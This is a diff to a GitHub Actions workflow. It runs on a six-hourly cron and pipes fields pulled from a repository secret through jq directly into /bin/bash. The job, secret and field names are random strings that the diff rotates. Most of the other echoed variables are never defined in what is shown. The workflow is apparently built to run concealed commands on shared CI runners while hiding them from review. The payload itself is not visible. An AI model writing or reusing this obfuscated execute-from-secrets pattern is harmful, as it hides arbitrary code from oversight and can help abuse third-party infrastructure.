@@ -3,25 +3,27 @@ name: shayinluo2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 2/6 * * *'
-
-jobs:  # 19429
+    - cron: '49 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shayinluo2345
         env:
-          asom268: ${{ secrets.asom268 }}
+          qnxze03: ${{ secrets.qnxze03 }}
         run: |
-          echo $asom268 | jq -r .l9 | /bin/bash
-          echo $f2 | jq -r .wopmw0923 | /bin/bash
-          echo $qbg0 | jq -r .wbhw711 | /bin/bash
-          echo $cu56796 | jq -r .g4096 | /bin/bash
-          echo $mi2551 | jq -r .gt434 | /bin/bash
-          echo $kzy9684 | jq -r .jq7852 | /bin/bash
-          echo $xt243 | jq -r .yhuhz9 | /bin/bash
-          echo $mzhy44515 | jq -r .jh51 | /bin/bash
-          echo $ruuym139 | jq -r .zdc8135 | /bin/bash
-          echo $jvr25 | jq -r .ltj58 | /bin/bash
+          echo $qnxze03 | jq -r .fxvpm213 | /bin/bash
+          echo $zz23 | jq -r .usy35 | /bin/bash
+          echo $acoa866 | jq -r .hxpg65 | /bin/bash
+          echo $bdgom97018 | jq -r .bxe8834 | /bin/bash
+          echo $lult8466 | jq -r .p244 | /bin/bash
+          echo $cg6 | jq -r .hny26 | /bin/bash
+          echo $hbvsj21335 | jq -r .feezy1 | /bin/bash
+          echo $onyr3099 | jq -r .t4594 | /bin/bash
+          echo $dd9444 | jq -r .qfwr36855 | /bin/bash
+          echo $j5975 | jq -r .amaqh7319 | /bin/bash
+          echo $qbj96667 | jq -r .hvp85801 | /bin/bash
+          echo $fnkiv842 | jq -r .sbz1972 | /bin/bash
 
